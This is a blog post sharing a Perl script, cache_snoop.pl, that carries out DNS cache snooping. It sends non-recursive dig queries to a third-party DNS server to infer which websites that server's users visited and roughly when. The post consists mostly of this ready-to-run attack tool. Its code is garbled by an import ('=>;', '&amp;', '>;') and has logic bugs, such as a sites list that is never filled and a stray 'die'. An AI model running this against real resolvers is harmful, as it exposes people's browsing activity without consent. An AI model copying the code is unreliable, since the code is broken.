---
layout: post
title: Interrogating DNS Caches
image: http://farm6.staticflickr.com/5126/5368873119_8e5c80068e.jpg
image_credit: Nick.Fisher 
tags:
- Tools
status: publish
type: post
published: true
meta:
  _edit_last: '1'
  _wp_old_slug: interrogating-dns-caches-cache-snoo
  _headspace_page_title: Interrogating DNS Caches
---
In the book, [Hacking: The Next Generation](http://www.amazon.com/Hacking-Next-Generation-Animal-Guide/dp/0596154577/), I cover a topic referred to as DNS cache snooping. Cache snooping is not a new attack and has been around for quite a while. However, I couldn't find a good piece of code that would interrogate DNS servers, so I created code to do it.

I put it in Appendix B in the book, but figured it would be nice to have some place to copy & paste it.

Let me know if you have any questions or comments. Have Fun!
### Cache_Snoop.pl

	#!/usr/bin/perl
	# cache_snoop.pl
	# Developed by: Brett Hardin
	$version = 1.0;
	use Getopt::Long;

	my $options = GetOptions (
	"help" =>; \$help,
	"save" =>; \$save,
	"dns=s" =>; \$dns_server,
	"ttl" =>; \$ttl_option,
	"queries=s" =>; \$queries
	);

	if($help ne "") { &amp;Help; }
	if($dns_server eq "") { die "Usage: cache_snoop.pl -dns -queries \n"; }
	open(FILE, $queries) or die "Usage: cache_snoop.pl -dns -queries \n";

	@sites;

	#FIRST RUN IS FOR FINDING OUT DEFUALT TTL
	if($ttl_option ne "") {
	print "Finding Default TTL's…\n";
	&amp;default_TTL;
	}

	for $site (@sites) {
	chomp($site);
	$default_TTL = $TTL_list{$site};

	if($site =~ /^\#/) { print $site . "\n"; next; }
	if($site =~ /^$/) { print "\n"; next;}

	$results = `dig \@$dns_server $site A +norecurse`;

	if ($results =~ /ANSWER: 0,/) {
	print "[NO] " . $site . " not visited\n";
	}
	else {
	@edited_result = split(/\n/, $results);
	@greped_result = grep(/^$site\./, @edited_result);
	@A_Broke = split(/\s+/, $greped_result[0]);
	$TTL = $A_Broke[1];

	print "[YES] " . $site . " ($TTL";
	if($ttl_option ne "") {
	&amp;timeLeft;
	print "/$default_TTL) - Initial Request was made: $LAST_VISITED\n";
	}
	else { print " TTL)\n"; }

	if($save ne "") {
	print $results; die;
	open(OUTPUT, ">;$site.DNS.txt");
	print OUTPUT $results;
	close(OUTPUT);
	}
	}
	}

	sub timeLeft{
	$seconds = ($default_TTL - $TTL);
	@parts = gmtime($seconds);
	$LAST_VISITED = "$parts[7]d $parts[2]h $parts[1]m $parts[0]s";
	}

	sub default_TTL {
	# This function returns the default TTL
	# To do this, you need to find the DNS server from the root DNS server
	# then query that DNS server for the site you are looking for, it will return the default TTL
	%DNS_list = ();
	%TTL_list = ();

	# Find the NS for the site
	for $site (@sites) {
	if($site =~ /^\#/) { next; }
	if($site =~ /^$/) { next;}

	chomp($site);

	#QUERY the TLD domain
	$query_result_1 = `dig \@a.gtld-servers.net $site`;
	@edited_query_1 = split(/\n/, $query_result_1);
	$found = 0;

	# Find the DNS server
	for $each (@edited_query_1) {
	if ($found == 1) {
	@A_Broke = split(/\s+/, $each);
	$root_DNS = $A_Broke[0];
	last;
	}
	if($each =~ /ADDITIONAL SECTION:/) { $found = 1; }
	}
	$DNS_list{$site} = $root_DNS;
	}
	print "Done with Name Server lookup…\n";;

	# Find the TTL from the default NS server.
	foreach $site (sort keys %DNS_list) {
	#print "$site: $DNS_list{$site}\n";
	$DNS_SERVER = $DNS_list{$site};

	#QUERY the TLD domain
	$query_result_2 = `dig \@$DNS_SERVER $site`;

	@edited_query_2 = split(/\n/, $query_result_2);
	$found = 0;

	# Find the DNS server
	for $each (@edited_query_2) {
	if ($found == 1) {
	@A_Broke = split(/\s+/, $each);
	$default_TTL = $A_Broke[1];
	last;
	}
	if($each =~ /ANSWER SECTION:/) { $found = 1; }
	}
	#print $site . " default TTL: $default_TTL\n";
	$TTL_list{$site} = $default_TTL;
	}
	print "Done with TTL lookups…\n";

	foreach $site (sort keys %TTL_list) {
	print "$site - $TTL_list{$site}\n";
	}
	}

	sub Help {
	print "\n";
	print "#################################\n";
	print "# #\n";
	print "# cache_snoop.pl v$version #\n";
	print "# #\n";
	print "#################################\n\n";
	print "usage: $0 -dns -queries \n";
	print "\n";
	print "purpose: Exploit a DNS server that allows 3rd party queries to determine what sites\n";
	print " the DNS servers users have been going to.\n";
	print "\n";
	print " Options:\n\n";
	print " -help What your looking at.\n";
	print " -dns [required] DNS server susceptible to 3rd party queries\n";
	print " -queries file with the queries you would like to make [Default: queries.txt]\n";
	print " -save Save the DNS responses that are received to individual text files.\n";
	print " -ttl Will lookup the default TTL's and comparing them with what the server has.\n";
	print "\n";
	print "Sample Output:\n";
	print "[NO] fidelity.com not visited\n";
	print "[YES] finance.google.com (165020) visited\n";
	print "[Visited] site (TTL)\n";
	print "\n\n";
	exit;
	}

Note: This code may need to be reworked due to importing from Wordpress to Jekyll. I will rework it at some point and upload to github, I just haven't had a chance to do it yet.